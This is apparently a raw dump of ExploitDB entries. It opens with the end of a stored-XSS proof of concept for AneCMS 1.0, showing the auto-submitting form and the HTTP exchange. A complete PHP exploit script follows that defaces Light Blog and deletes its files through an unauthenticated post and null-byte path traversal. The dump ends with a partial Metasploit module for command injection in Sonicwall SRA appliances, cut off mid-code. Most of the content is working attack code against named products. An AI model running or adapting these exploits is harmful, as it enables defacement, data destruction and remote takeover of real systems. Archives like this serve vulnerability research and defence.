  \r\n     \r\n  #   Proof of concept   #\r\n   \r\n  Targeted URL:  http://server/acp/index.php?p=cfg&m=links\r\n    \r\n   \r\n  In ADD LINKS Field provide the malicious script to store in the Database.\r\n \r\n  That is-\r\n \r\n                      <html>\r\n \r\n                          <body>\r\n \r\n                             <form name="XYZ" action="http://server/acp/index.php?p=cfg&m=links&id=0" method="post">\r\n \r\n                                    <input type=hidden name="name" value=""><script>alert("XSS")</script>">\r\n \r\n                                    <input type=hidden name="link" value=""><script>alert("XSS")</script>">\r\n \r\n                                    <input type=hidden name="type" value="1">\r\n               \r\n                                    <input type=hidden name="view" value="0">\r\n \r\n                             </form>\r\n \r\n                               <script>\r\n \r\n                                 document.XYZ.submit();\r\n \r\n                               </script>\r\n \r\n                          </body>\r\n \r\n                        </html>\r\n \r\n \r\n  =======================================================================\r\n  Request -\r\n  =======================================================================\r\n  POST /acp/index.php?p=cfg&m=links&id=0 HTTP/1.1\r\n  Host: server\r\n  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8\r\n  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n  Accept-Language: en-us,en;q=0.5\r\n  Accept-Encoding: gzip,deflate\r\n  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n  Keep-Alive: 300\r\n  Proxy-Connection: keep-alive\r\n  Referer: http://server/acp/index.php?p=cfg&m=links\r\n  Cookie: PHPSESSID=200fecb6b36334b983ebe251d11a5df9\r\n  Content-Type: application/x-www-form-urlencoded\r\n  Content-Length: 41\r\n \r\n  name="><script>alert("XSS")</script>&link="><script>alert("XSS")</script>&type=1&view=0\r\n  \r\n  =======================================================================\r\n  =======================================================================\r\n  Response-\r\n  =======================================================================\r\n  HTTP/1.1 200 OK\r\n  Date: Thu, 11 Mar 2010 06:59:03 GMT\r\n  Server: Apache/2.2.9 (Debian) mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n  Expires: Thu, 19 Nov 1981 08:52:00 GMT\r\n  Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\n  Pragma: no-cache\r\n  Vary: Accept-Encoding\r\n  Content-Type: text/html; charset: utf-8\r\n  Content-Length: 7771\r\n \r\n&#65279;&#65279;<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\r\n<title>Transdmin Light</title>\r\n \r\n<!-- CSS -->\r\n<link href="./skins/aaa/css/transdmin.css" rel="stylesheet" type="text/css" media="screen" />\r\n<!--[if IE 6]><link rel="stylesheet" type="text/css" media="screen" href="./skins/aaa/css/ie6.css" /><![endif]-->\r\n<!--[if IE 7]><link rel="stylesheet" type="text/css" media="screen" href="./skins/aaa/css/ie7.css" /><![endif]-->\r\n \r\n<!-- JavaScripts-->\r\n<link rel="stylesheet" type="text/css" href="http://server/system/js/jquery.jgrowl.css" media="screen"/> <script type="text/javascript" src="http://server/system/js/jquery-1.3.2.min.js"></script><script type="text/javascript" src="http://server/system/js/jquery.jgrowl_minimized.js"></script>\r\n<style>div.jGrowl div.green {\r\nbackground-color:       #00D400;\r\ncolor:                  navy;\r\n    }</style>\r\n</head>\r\n \r\n<body>\r\n     \r\n    <div id="wrapper">\r\n        <!-- h1 tag stays for the logo, you can use the a tag for linking the index page -->\r\n        <h1><a href="#"><span>Administration</span></a></h1>\r\n \r\n        <!-- You can name the links with lowercase, they will be transformed to uppercase by CSS, we prefered to name them with uppercase to have the same effect with disabled stylesheet -->\r\n        <ul id="mainNav">\r\n            <li><a href="index.php">Dashboard</a></li>\r\n            <li><a href="?p=cfg">Configuration</a></li>\r\n            <li><a href="?p=tpl">Design</a></li>\r\n            <li><a href="?p=mod">Modules</a></li>\r\n            <li class="logout"><a href="#">Logout Admin</a></li>\r\n        <li class="logout"><a href="../index.php">CMS</a></li>\r\n        </ul>\r\n        <!-- // #end mainNav -->\r\n \r\n        <div id="containerHolder">\r\n            <div id="container">\r\n    <div id="sidebar">\r\n         \r\n    <ul class="sideNav">\r\n                                <li><a href="?p=cfg">Show Setting</a></li>\r\n                                <li><a href="?p=cfg&m=mod">Modify Setting</a></li>\r\n                                <li><a href="?p=cfg&m=links">Links Management</a></li>\r\n                                <li><a href="?p=cfg&m=reposerver">Repository Server</a></li>\r\n                            </ul>\r\n         \r\n    </div>\r\n     \r\n                <h2><a href="#">Configuration</a> \xbb <a href="#" class="active">Links</a></h2>\r\n \r\n                <div id="main"><br>\r\n \r\n                <form action="?p=cfg&m=links&id=0" class="jNice" method="POST">\r\n \r\n<h3>Aggiungi un nuovo Link</h3>\r\n                <fieldset><p><label>Nome link:</label><input type="text" class="text-long" name="name" value=""/></p>\r\n                <p><label>Nome link:</label><input type="text" class="text-long" name="link" value=""/></p>\r\n<p><label>Tipo Link:</label><input type="radio" name="type" value="1" checked>Barra Links <input type="radio" name="type" value="2">Menu Links</p>\r\n \r\n<p><label>Accesso:</label>\r\n                <select name="view">\r\n                        <option value="0">Visible only to guests</option>\r\n                        <option value="1">Visible to all</option>\r\n                        <option value="2">Visible only to members</option>\r\n                        <option value="3">Visible only to admins</option>\r\n                </select>\r\n                </p>\r\n                 \r\n                <input type="submit" value="Send" />\r\n</fieldset>\r\n                        </form>\r\n \r\n<table cellpadding="0" cellspacing="0">\r\n                <tr>\r\n                                <td>Name</td>\r\n                <td>Link</td>\r\n                 \r\n                                 <td>Options</td>\r\n                            </tr>\r\n                            <tr><td colspan="4">Bar Links</td></tr>\r\n                                <tr class="odd">\r\n                                <td>Home</td>\r\n                <td>index.php</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=1">Modify</a> <a href="?p=cfg&m=links&a=delete&id=1">Delete</a> <a href="?p=cfg&m=links&a=move&type=down&id=1">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>Blog</td>\r\n                <td>blog</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=2">Modify</a> <a href="?p=cfg&m=links&a=delete&id=2">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=2">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=2">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>Registrati</td>\r\n                <td>register</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=4">Modify</a> <a href="?p=cfg&m=links&a=delete&id=4">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=4">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=4">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>ACP</td>\r\n                <td>acp</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=5">Modify</a> <a href="?p=cfg&m=links&a=delete&id=5">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=5">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=5">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>Widgets</td>\r\n                <td>index.php?modifywidgets</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=6">Modify</a> <a href="?p=cfg&m=links&a=delete&id=6">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=6">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=6">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>master</td>\r\n                <td>master.asp</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=38">Modify</a> <a href="?p=cfg&m=links&a=delete&id=38">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=38">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=38">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>"><script>alert("XSS")</script></td>\r\n                <td>"><script>alert("XSS")</script></td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=39">Modify</a> <a href="?p=cfg&m=links&a=delete&id=39">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=39">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=39">Move Down</a></td>\r\n                            </tr>\r\n            <tr><td colspan="4">Menu Links</td></tr>\r\n                                <tr class="odd">\r\n                                <td>home</td>\r\n                <td>index.php</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=14">Modify</a> <a href="?p=cfg&m=links&a=delete&id=14">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=14">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=14">Move Down</a></td>\r\n                            </tr>\r\n                            <tr class="odd">\r\n                                <td>Blog</td>\r\n                <td>blog</td>\r\n                 \r\n                <td><a href="?p=cfg&m=links&a=modify&id=19">Modify</a> <a href="?p=cfg&m=links&a=delete&id=19">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=19">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=19">Move Down</a></td>\r\n                            </tr>\r\n                                    </table>\r\n<br />\r\n</div>\r\n \r\n                 \r\n                <!-- // #main -->\r\n \r\n                <div class="clear"></div>\r\n            </div>\r\n            <!-- // #container -->\r\n        </div>\r\n        <!-- // #containerHolder -->\r\n \r\n        <p id="footer">Feel free to use and customize it. <a href="http://server">Credit is appreciated.</a></p>\r\n    </div>\r\n    <!-- // #wrapper -->\r\n     \r\n                    <script type="text/javascript">\r\n                     $(function()\r\n            {\r\n            });</script>\r\n</body>\r\n</html>\r\n \r\n  \r\n=======================================================================\r\n  \r\n  \r\n   After completion Just Refres the page and the script get executed again and again.\r\n   \r\n   \r\n   #If you have any questions, comments, or concerns, feel free to contact me.', u'description': u"AneCMS 1.0 - 'index.php' Multiple HTML Injection Vulnerabilities", u'platform': u'php', u'author': u'pratul agrawal', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-03-11T00:00:00+00:00', u'_id': 33748, u'type': u'webapps', u'port': 0}

CVE: []
Description: Light Blog Remote - Multiple Vulnerabilities
{u'code': u'#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho "\\r\\n";\r\necho "Light Blog Multiple Vulnerabilities Exploit\\r\\n";\r\necho "by BlackHawk <hawkgotyou@gmail.com>\\r\\n";\r\necho "Thanks to rgod for the php code and Marty for the Love\\r\\n\\r\\n";\r\nif ($argc<4) {\r\necho "Usage: php ".$argv[0]." Site Path AttackType Related\\r\\n";\r\necho "Host:             target server (ip/hostname)\\r\\n";\r\necho "Path:             path to LightBlog\\r\\n";\r\necho "AttackType:       1 - Create New Post (Title must be of one word)\\r\\n";\r\necho "            |-> Related: Title Post\\r\\n";\r\necho "            |-> Es: php ".$argv[0]." localhost /blog/ 1 Hacked I Got You\\r\\n\\r\\n";\r\necho "          2 - Deface Blog (With XSS)\\r\\n";\r\necho "            |-> Related: WebPage\\r\\n";\r\necho "            |-> Es: php ".$argv[0]." localhost /blog/ 2 http://site.com/\\r\\n\\r\\n";\r\necho "          3 - Deface Blog (Deleting blog.php)\\r\\n";\r\necho "            |-> Related: NickName\\r\\n";\r\necho "            |-> Es: php ".$argv[0]." localhost /blog/ 3 BlackHawk\\r\\n\\r\\n";\r\necho "";\r\necho "\\r\\n";\r\necho "";\r\ndie;\r\n}\r\n\r\n/*\r\nThere are some critical vulnerabilities in this quite simple Blog Engine..\r\n\r\n1 - You do not need to know the right password to send a new Post (no cecking);\r\n2 - You can erase (even with mq=on) all file that are stored on the server:\r\n\r\n[...]\r\n$t = stripslashes($t);\r\n[...]\r\n$fc = fopen ("blog_comments/$t.txt", "w");\r\nfwrite ($fc, "");\r\n[...]\r\n\r\n3-Using point No 1 you can do some XSS couse there isn\'t any anti-Xss code for admins\r\n4-If mq=on than you can deface the site (but no injecting PHP cause < and > are properly parsed)\r\n\r\nsorry for my bad english,\r\n\r\nBlackHawk hawkgotyou@gmail.com\r\n*/\r\nerror_reporting(0);\r\nini_set("max_execution_time",0);\r\nini_set("default_socket_timeout",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n $result=\'\';$exa=\'\';$cont=0;\r\n for ($i=0; $i<=strlen($string)-1; $i++)\r\n {\r\n  if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n  {$result.="  .";}\r\n  else\r\n  {$result.="  ".$string[$i];}\r\n  if (strlen(dechex(ord($string[$i])))==2)\r\n  {$exa.=" ".dechex(ord($string[$i]));}\r\n  else\r\n  {$exa.=" 0".dechex(ord($string[$i]));}\r\n  $cont++;if ($cont==15) {$cont=0; $result.="\\r\\n"; $exa.="\\r\\n";}\r\n }\r\n return $exa."\\r\\n".$result;\r\n}\r\n$proxy_regex = \'(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)\';\r\nfunction sendpacketii($packet)\r\n{\r\n global $proxy, $host, $port, $html, $proxy_regex;\r\n if ($proxy==\'\') {\r\n   $ock=fsockopen(gethostbyname($host),$port);\r\n   if (!$ock) {\r\n     echo \'No response from \'.$host.\':\'.$port; die;\r\n   }\r\n }\r\n else {\r\n       $c = preg_match($proxy_regex,$proxy);\r\n   if (!$c) {\r\n     echo \'Not a valid proxy...\';die;\r\n   }\r\n   $parts=explode(\':\',$proxy);\r\n   echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\\r\\n";\r\n   $ock=fsockopen($parts[0],$parts[1]);\r\n   if (!$ock) {\r\n     echo \'No response from proxy...\';die;\r\n       }\r\n }\r\n fputs($ock,$packet);\r\n if ($proxy==\'\') {\r\n   $html=\'\';\r\n   while (!feof($ock)) {\r\n     $html.=fgets($ock);\r\n   }\r\n }\r\n else {\r\n   $html=\'\';\r\n   while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n     $html.=fread($ock,1);\r\n   }\r\n }\r\n fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$attack_type=$argv[3];\r\n$port=80;\r\n$proxy="";\r\n\r\n\r\nif (($path[0]<>\'/\') or ($path[strlen($path)-1]<>\'/\')) {echo \'Error... check the path!\'; die;}\r\nif ($proxy==\'\') {$p=$path;} else {$p=\'http://\'.$host.\':\'.$port.$path;}\r\n\r\nswitch($attack_type)\r\n{\r\ncase 1: //Insert New Post\r\n$title=$argv[4];\r\n$message="";\r\nfor ($i=5; $i<=$argc-1; $i++){\r\n$message.=" ".$argv[$i];\r\n}\r\n$title=urlencode($title);\r\n$message=urlencode($message);\r\necho "Attack No 1 - Sending New Post..\\r\\n";\r\n$data="t=$title";\r\n$data.="&c=$message";\r\n$data.="&Submit=Post";\r\n$packet="POST ".$p."LightBlog/blog_script.php HTTP/1.0\\r\\n";\r\n$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n";\r\n$packet.="Referer: http://".$host.$path."/blog.php\\r\\n";\r\n$packet.="Accept-Language: it\\r\\n";\r\n$packet.="Content-Type: application/x-www-form-urlencoded\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Content-Length: ".strlen($data)."\\r\\n";\r\n$packet.="Connection: Close\\r\\n";\r\n$packet.="Cache-Control: no-cache\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho "Ok, Post Sent";\r\nbreak;\r\n\r\ncase 2: // Deface With XSS\r\n$dfc_url=$argv[4];\r\n$deface_url=urlencode("<script>window.location=(\'$dfc_url\')</script>");\r\necho "Attack No 2 - Sending New Post With XSS..\\r\\n";\r\n$data="t=$deface_url";\r\n$data.="&c=msg";\r\n$data.="&Submit=Post";\r\n$packet="POST ".$p."LightBlog/blog_script.php HTTP/1.0\\r\\n";\r\n$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n";\r\n$packet.="Referer: http://".$host.$path."/blog.php\\r\\n";\r\n$packet.="Accept-Language: it\\r\\n";\r\n$packet.="Content-Type: application/x-www-form-urlencoded\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Content-Length: ".strlen($data)."\\r\\n";\r\n$packet.="Connection: Close\\r\\n";\r\n$packet.="Cache-Control: no-cache\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho "Ok, Post Sent";\r\nbreak;\r\n\r\nbreak;\r\ncase 3: // Defacing the original blog.php file\r\n$nickname=$argv[4];\r\n$packet ="GET ".$p."LightBlog/blog_comments.php?comment=Comment&title=title HTTP/1.0\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\nsendpacketii($packet);\r\n$temp=explode("name=\\"rand\\" id=\\"rand\\" value=\\"",$html);\r\n$temp2=explode("\\"></input>",$temp[1]);\r\n$random_code = $temp2[0];\r\n$temp=explode("name=\\"rand\\" id=\\"rand\\" value=\\"$random_code\\"></input>",$html);\r\n$temp2=explode(" ",$temp[1]);\r\n$small_code = $temp2[0];\r\n\r\n\r\n$data="t=../../blog.php%00";\r\n$data.="&c=ciao";\r\n$data.="&Submit=Post";\r\n$packet="POST ".$p."/LightBlog/blog_script.php HTTP/1.0\\r\\n";\r\n$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n";\r\n$packet.="Referer: http://".$host.$path."/blog.php\\r\\n";\r\n$packet.="Accept-Language: it\\r\\n";\r\n$packet.="Content-Type: application/x-www-form-urlencoded\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Content-Length: ".strlen($data)."\\r\\n";\r\n$packet.="Connection: Close\\r\\n";\r\n$packet.="Cache-Control: no-cache\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho "blog.php File erased\\r\\n";\r\n\r\n// This part will work only if mq=off elsewhere the exploit will only delete blog.php\r\n$deface_text=urlencode("|:. $nickname got you! .:");\r\n$signature=urlencode(" BlackHawk And Piggy-Marty Rulez info --> <hawkgotyou@gmail.com>");\r\n$packet ="GET ".$p."LightBlog/add_comment_script.php?name=$deface_text&comment=$signature&rand=$random_code&val=$small_code&Submit=Submit&title=../../blog.php/%00 HTTP/1.0\\r\\n";\r\n$packet.="Referer: http://".$host.$path."blog.php\\r\\n";\r\n$packet.="Accept-Language: it\\r\\n";\r\n$packet.="Content-Type: application/x-www-form-urlencoded\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\nsendpacketii($packet);\r\necho "Ok, Blog Defaced";\r\nbreak;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-10-27]', u'description': u'Light Blog Remote - Multiple Vulnerabilities', u'platform': u'php', u'author': u'BlackHawk', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-10-27T00:00:00+00:00', u'_id': 2658, u'type': u'webapps', u'port': 0}

CVE: []
Description: Sonicwall < 8.1.0.2-14sv - 'sitecustomization.cgi' Command Injection (Metasploit)
{u'code': u'# Exploit Title: Sonicwall importlogo/sitecustomization CGI Remote Command Injection Vulnerablity \r\n# Date: 12/25/2016\r\n# Exploit Author: xort @ Critical Start\r\n# Vendor Homepage: www.sonicwall.com\r\n# Software Link: sonicwall.com/products/sra-virtual-appliance\r\n# Version: 8.1.0.2-14sv\r\n# Tested on: 8.1.0.2-14sv\r\n#             \r\n# CVE : (awaiting cve)\r\n\r\n# vuln1: importlogo.cgi / logo1 parameter (any contents can be uploaded)    \r\n# vuln2: sitecustomization.cgi / portalname (filename) parameter   \r\n\r\n# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug. \r\n#\r\n# xort @ Critical Start\r\n\r\n\r\n\r\n\r\nrequire \'msf/core\'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n\tRank = ExcellentRanking\r\n\tinclude  Exploit::Remote::Tcp\r\n        include Msf::Exploit::Remote::HttpClient\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'Sonicwall SRA <= v8.1.0.2-14sv remote exploit\',\r\n\t\t\t\t\t\'Description\'    => %q{\r\n\t\t\t\t\tThis module exploits a remote command execution vulnerability in\r\n\t\t\t\tthe Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in\r\n\t\t\t\ta section of the machine\'s adminstrative infertface for performing configurations \r\n\t\t\t\trelated to on-connect scripts to be launched for users\'s connecting.\t\r\n\t\t\t},\r\n\t\t\t\'Author\'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t\'xort@Critical Start\', # vuln + metasploit module\r\n\t\t\t\t],\r\n\t\t\t\'Version\'        => \'$Revision: 1 $\',\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'none\', \'none\'],\r\n\t\t\t\t],\r\n\t\t\t\'Platform\'      => [ \'linux\'],\r\n\t\t\t\'Privileged\'     => true,\r\n\t\t\t \'Arch\'          => [ ARCH_X86 ],\r\n                        \'SessionTypes\'  => [ \'shell\' ],\r\n                        \'Privileged\'     => false,\r\n\r\n\t\t        \'Payload\'        =>\r\n                                { \r\n                                  \'Compat\' =>\r\n                                  {\r\n                                        \'ConnectionType\' => \'find\',\r\n                                  }\r\n                                },\r\n\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\'Linux Universal\',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\'Arch\' => ARCH_X86,\r\n\t\t\t\t\t\t\t\t\'Platform\' => \'linux\'\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t\'DefaultTarget\' => 0))\r\n\r\n\t\t\tregister_options(\r\n\t\t\t\t[\r\n\t\t\t\t\tOptString.new(\'PASSWORD\', [ false, \'Device password\', "" ]),\t\r\n\t\t\t         \tOptString.new(\'USERNAME\', [ true, \'Device password\', "admin" ]),\t\r\n\t\t\t\t\tOptString.new(\'CMD\', [ false, \'Command to execute\', "" ]),\t\r\n\t\t\t\t\tOpt::RPORT(443),\r\n\t\t\t\t], self.class)\r\n\tend\r\n\r\n        def do_login(username, password_clear)\r\n                vprint_status( "Logging into machine with credentials...\\n" )\r\n\r\n                # vars\r\n                timeout = 1550;\r\n\r\n                # send request  \r\n                res = send_request_cgi(\r\n                {\r\n                      \'method\'  => \'POST\',\r\n                      \'uri\'     => "/cgi-bin/userLogin",\r\n\t\t      \'headers\' => {\r\n\t\t\t   \'Connection\' => \'close\',\r\n\t\t\t   \'Content-Type\' => \'application/x-www-form-urlencoded\',\r\n\t\t\t   \'User-Agent\' => \'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0\',\r\n\t              },\r\n                      \'vars_post\' => {\r\n\t\t\t   \'username\' => username,\r\n\t\t\t   \'password\' => password_clear,\r\n\t\t\t   \'domain\' => \'LocalDomain\',\r\n\t\t\t   \'loginButton\' => \'Login\',\r\n\t\t\t   \'state\' => \'login\',\r\n\t\t\t   \'login\' => \'true\',\r\n\t\t\t   \'VerifyCert\' => \'0\',\r\n\t\t\t   \'portalname\' => \'VirtualOffice\',\r\n\t\t\t   \'ajax\' => \'true\'\r\n\t\t       },\r\n                }, timeout)\r\n\r\n\t\tswap = res.headers[\'Set-Cookie\'].split(\'\\n\').grep(/(.*)swap=([^;]+);/){$2}[0]\r\n\t\t\r\n                return swap\r\n        end\r\n\r\n        def upload_payload(swap_cookie, file_data)\r\n                vprint_status( "Upload Payload..." )\r\n\r\n                # vars\r\n                timeout = 1550;\r\n\r\n                upload_req = [\r\n                [ "portalName","VirtualOffice" ],\r\n                [ "defaultLogo","0" ],\r\n                [ "uiVersion","2" ],\r\n                [ "bannerBackground", "light" ]\r\n                ]\r\n\r\n                boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)\r\n                post_data = ""\r\n\r\n\t\t# assemble upload_req parms\r\n                upload_req.each do |xreq|\r\n                    post_data << "--#{boundary}\\r\\n"\r\n                    post_data << "Content-Disposition: form-data; name=\\"#{xreq[0]}\\"\\r\\n\\r\\n"\r\n                    post_data << "#{xreq[1]}\\r\\n"\r\n                end\r\n\r\n                # add malicious file\r\n                post_data << "--#{boundary}\\r\\n"\r\n                post_data << "Content-Disposition: form-data; name=\\"logo1\\"; filename=\\"x.jpg\\"\\r\\n"\r\n\t\tpost_data << "Content-Type: image/jpeg\\r\\n\\r\\n"\r\n                post_data << "#{file_data}\\r\\n"\r\n \r\n\t\tpost_data << "--#{boundary}--\\r\\n"\r\n\r\n                res = send_request_cgi({\r\n                   \'method\' => \'POST\',\r\n                   \'uri\'    => "/cgi-bin/importlogo?uploadId=1",\r\n                   \'ctype\'  => "multipart/form-data; boundary=#{boundary}",\r\n                   \'data\'   => post_data,\r\n                   \'headers\' =>\r\n                        {\r\n                                \'UserAgent\' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",\r\n\t\t\t\t\'Cookie\' => \'swap=\'+swap_cookie+\';\',\r\n                        }\r\n                }, timeout)\r\n                \r\n\r\n        end\r\n\r\n\r\n\tdef run_command(swap_cookie, cmd)\r\n\r\n\t\tvprint_status( "Running Command...\\n" )\r\n\r\n                # vars\r\n                timeout = 1550;\r\n\r\n\t\tvprint_status("creating filename on target: #{cmd}\\n")\r\n\r\n                upload_req = [\r\n                [ "portalname", cmd ],\r\n                [ "portaltitle","Virtual Office" ],\r\n                [ "bannertitle","Virtual Office" ],\r\n                [ "bannermessage","<h1>Dell Sonicwall</h1>" ],\r\n                [ "portalUrl","https://192.168.84.155/portal/xxx" ],\r\n                [ "loginflag","on" ],\r\n                [ "bannerflag","on" ],\r\n                [ "httpOnlyCookieFlag","on" ],\r\n                [ "cachecontrol","on" ],\r\n                [ "uniqueness", "on" ],\r\n                [ "duplicateLoginAction", "1" ],\r\n                [ "livetilesmalllogo", "" ],\r\n                [ "livetilemediumlogo", "" ],\r\n                [ "livetilewidelogo", "" ],\r\n                [ "livetilelargelogo", "" ],\r\n                [ "livetilebackground", "#0085C3" ],\r\n                [ "livetilename", "" ],\r\n                [ "home2page", "on" ],\r\n                [ "allowNetExtender", "on" ],\r\n                [ "virtualpassagepage", "on" ],\r\n                [ "cifsdirectpage", "on" ],\r\n                [ "cifspage", "on" ],\r\n                [ "cifsappletpage", "on" ],\r\n                [ "cifsapplet", "on" ],\r\n                [ "cifsdefaultfilesharepath", "" ],\r\n                [ "home3page", "on" ],\r\n                [ "showAllBookmarksTab", "on" ],\r\n                [ "showDefaultTabs", "on" ],\r\n                [ "showCopyright", "on" ],\r\n                [ "showSidebar", "on" ],\r\n                [ "showUserPortalHelpButton", "on" ],\r\n                [ "userPortalHelpURL", "" ],\r\n                [ "showUserPortalOptionsButton", "on" ],\r\n                [ "homemessage", "<h1>Welcome to the Dell SonicWALL Virtual Office</h1>" ],\r\n                [ "hptabletitle", "Virtual Office Bookmarks" ],\r\n                [ "vhostName", "www.#{Rex::Text.rand_text_hex(32)}.com" ],\r\n                [ "vhostAlias", "" ],\r\n                [ "vhostInterface", "ALL" ],\r\n                [ "vhostEnableKeepAlive", "on" ],\r\n                [ "cdssodn", ".yahoo.com" ],\r\n                [ "enableSSLForwardSecrecy", "0" ],\r\n                [ "enableSSLProxyVerify", "0" ],\r\n                [ "sslProxyProtocol", "0" ],\r\n                [ "loginSchedule", "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" ],\r\n                [ "formsection", "main" ],\r\n                [ "doAdd", "1" ],\r\n                [ "cgiaction", "1" ],\r\n                [ "themename", "stylesonicwall" ],\r\n                [ "onlinehelp", "" ],\r\n                [ "tmp_currentVhostName", "" ],\r\n                [ "tmp_currentVhostAlias", "" ],\r\n                [ "tmp_currentVhostInterface", "ALL" ],\r\n                [ "tmp_currentVhostIp", "" ],\r\n                [ "tmp_currentVhostIPv6", "" ],\r\n                [ "tmp_currentVhostEnableHTTP", "0" ],\r\n                [ "tmp_currentVhostEnableKeepAlive", "1" ],\r\n                [ "tmp_currentVhostCert", "" ],\r\n                [ "tmp_currEnforceSSLProxyProtocol", "0" ],\r\n                [ "tmp_currSSLProxyProtocol", "0" ],\r\n                [ "tmp_currEnableSSLProxyVerify", "0" ],\r\n                [ "tmp_currEnableSSLForwardSecrecy", "0" ],\r\n                [ "tmp_currentVhostOffloadRewrite", "" ],\r\n                [ "restartWS", "1" ],\r\n                [ "reuseFavicon", "" ],\r\n                [ "oldReuseFavicon", "" ],\r\n                ]\r\n\r\n                boundary = 